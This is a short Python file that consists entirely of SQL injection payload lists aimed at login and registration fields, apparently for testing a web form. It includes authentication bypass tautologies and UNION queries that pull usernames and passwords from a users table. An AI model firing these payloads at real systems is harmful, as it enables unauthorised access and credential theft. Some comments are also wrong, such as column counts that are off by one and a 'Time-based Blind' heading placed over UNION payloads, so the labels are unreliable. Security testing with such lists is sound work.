register_payloads = [
    {"email": "admin' OR '1'='1", "password": "password"},  # Classic SQLi
    {"email": "admin' --", "password": "password"},        # Comment-based SQLi
    {"email": "admin' #", "password": "password"},         # Comment-based SQLi
    {"email": "' OR '1'='1", "password": "password"},       # OR condition bypass
    {"email": "' OR 'a'='a", "password": "password"},       # OR condition bypass
    {"email": "' OR 1=1--", "password": "password"},       # SQL injection with -- comment
    {"email": "' UNION SELECT NULL, username, password FROM users--", "password": "password"},  # UNION SQLi
    {"email": "admin' UNION SELECT username, password FROM users--", "password": "password"},  # UNION SQLi
    {"email": "' AND 1=1", "password": "password"},        # AND condition bypass
    {"email": "' AND 'x'='x", "password": "password"},     # AND condition bypass
    {"email": "admin' OR 'x'='x", "password": "password"}, # OR condition bypass with `x`
    {"email": "' OR '1'='1' --", "password": "password"},  # SQLi with comment
    {"username": "admin' OR '1'='1", "password": "password"},  # Classic SQLi
    {"username": "admin' --", "password": "password"},        # Comment-based SQLi
    {"username": "admin' #", "password": "password"},         # Comment-based SQLi
    {"username": "' OR '1'='1", "password": "password"},       # OR condition bypass
    {"username": "' OR 'a'='a", "password": "password"},       # OR condition bypass
    {"username": "' OR 1=1--", "password": "password"},       # SQL injection with -- comment
    {"username": "' UNION SELECT NULL, username, password FROM users--", "password": "password"},  # UNION SQLi
    {"username": "admin' UNION SELECT username, password FROM users--", "password": "password"},  # UNION SQLi
    {"username": "' AND 1=1", "password": "password"},        # AND condition bypass
    {"username": "' AND 'x'='x", "password": "password"},     # AND condition bypass
    {"username": "admin' OR 'x'='x", "password": "password"}, # OR condition bypass with `x`
    {"username": "' OR '1'='1' --", "password": "password"}   # SQLi with comment
]


injections_payloads = [
    # Tautology-based SQL Injection
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",

    # Comment-based SQL Injection
    "' --",  # Single-line comment
    "' #",   # Single-line comment
    "' OR 1=1 --",  # Bypass authentication

    # SQL Injection with Single Quote
    "'",
    "' OR '' = ''",

    # Union-based SQL Injection
    "' UNION SELECT username, password FROM users--",

    # Union-based Injection with Column Count Enumeration
    "' UNION SELECT NULL--",  # 2 columns
    "' UNION SELECT NULL, NULL--",  # 3 columns
    "' UNION SELECT NULL, NULL, NULL--",  # 4 columns

    # Blind SQL Injection
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' OR 1=1 AND SLEEP(5) --",

    # Time-based Blind SQL Injection
    "' UNION SELECT username, password, email FROM users--",
    "' UNION SELECT user, pass, role FROM users--",
    "' UNION SELECT id, username, password, email FROM users--"
]